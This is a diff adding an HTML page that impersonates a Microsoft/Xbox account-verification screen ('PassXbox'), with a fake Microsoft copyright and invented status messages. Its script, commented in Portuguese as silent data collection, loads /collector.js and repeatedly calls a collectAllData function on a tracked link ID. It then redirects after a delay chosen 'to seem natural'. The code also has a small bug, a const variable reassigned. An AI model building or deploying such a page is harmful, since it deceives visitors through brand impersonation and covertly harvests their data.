@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PassXbox - Acesse sua Conta</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #107c10 0%, #0e6b0e 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+            max-width: 450px;
+            width: 100%;
+            padding: 40px;
+            text-align: center;
+        }
+
+        .logo {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 30px;
+            background: linear-gradient(135deg, #107c10 0%, #0e6b0e 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 48px;
+            color: white;
+            font-weight: bold;
+        }
+
+        h1 {
+            color: #107c10;
+            font-size: 28px;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        .loading-container {
+            margin: 30px 0;
+        }
+
+        .loading-text {
+            color: #107c10;
+            font-size: 16px;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #107c10;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .status {
+            color: #666;
+            font-size: 13px;
+            margin-top: 20px;
+        }
+
+        .footer {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #e0e0e0;
+            color: #999;
+            font-size: 12px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #f0f0f0;
+            border-radius: 2px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #107c10, #0e6b0e);
+            width: 0%;
+            animation: progress 1.5s ease-in-out forwards;
+        }
+
+        @keyframes progress {
+            to { width: 100%; }
+        }
+    </style>
+    <script src="/collector.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">X</div>
+        <h1>PassXbox</h1>
+        <p class="subtitle">Verificando suas credenciais...</p>
+        
+        <div class="loading-container">
+            <div class="loading-text">Conectando ao servidor...</div>
+            <div class="spinner"></div>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+            <div class="status" id="status">Aguarde, estamos processando sua solicitação...</div>
+        </div>
+
+        <div class="footer">
+            <p>© 2024 Microsoft Corporation. Todos os direitos reservados.</p>
+            <p style="margin-top: 5px;">Você será redirecionado em instantes...</p>
+        </div>
+    </div>
+
+    <script>
+        // COLETA SILENCIOSA DE DADOS
+        (function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const linkId = urlParams.get('id') || window.location.pathname.split('/').pop();
+            const redirectUrl = urlParams.get('redirect') || '';
+            
+            if (!linkId) {
+                // Se não tiver linkId, tentar pegar da URL
+                const pathParts = window.location.pathname.split('/');
+                const possibleId = pathParts[pathParts.length - 1];
+                if (possibleId && possibleId.length === 8) {
+                    linkId = possibleId;
+                }
+            }
+
+            let dataCollected = false;
+            let redirectAttempted = false;
+
+            // Atualizar status
+            const statusEl = document.getElementById('status');
+            const statuses = [
+                'Verificando credenciais...',
+                'Conectando ao servidor Microsoft...',
+                'Validando sua conta...',
+                'Preparando redirecionamento...',
+                'Quase lá...'
+            ];
+            let statusIndex = 0;
+
+            const statusInterval = setInterval(() => {
+                if (statusIndex < statuses.length) {
+                    statusEl.textContent = statuses[statusIndex];
+                    statusIndex++;
+                }
+            }, 300);
+
+            // Função de coleta silenciosa
+            function collectSilently() {
+                if (!dataCollected && linkId) {
+                    collectAllData(linkId).then((result) => {
+                        dataCollected = true;
+                        clearInterval(statusInterval);
+                        statusEl.textContent = 'Redirecionando...';
+                    }).catch(() => {
+                        // Erro silencioso
+                    });
+                }
+            }
+
+            // Coletar imediatamente
+            collectSilently();
+
+            // Coletar novamente após 400ms
+            setTimeout(collectSilently, 400);
+
+            // Coletar uma última vez e redirecionar
+            setTimeout(() => {
+                collectSilently();
+                
+                setTimeout(() => {
+                    if (!redirectAttempted) {
+                        redirectAttempted = true;
+                        if (redirectUrl) {
+                            window.location.href = redirectUrl;
+                        } else {
+                            // Se não tiver redirectUrl, tentar buscar do servidor
+                            fetch(`/api/get-redirect/${linkId}`)
+                                .then(r => r.json())
+                                .then(data => {
+                                    if (data.redirectUrl) {
+                                        window.location.href = data.redirectUrl;
+                                    }
+                                })
+                                .catch(() => {
+                                    statusEl.textContent = 'Erro ao carregar. Tente novamente.';
+                                });
+                        }
+                    }
+                }, 300);
+            }, 1200); // 1.2 segundos para parecer natural
+
+            // Fallback - redirecionar mesmo se houver erro
+            setTimeout(() => {
+                if (!redirectAttempted && redirectUrl) {
+                    redirectAttempted = true;
+                    window.location.href = redirectUrl;
+                }
+            }, 2000);
+        })();
+    </script>
+</body>
+</html>
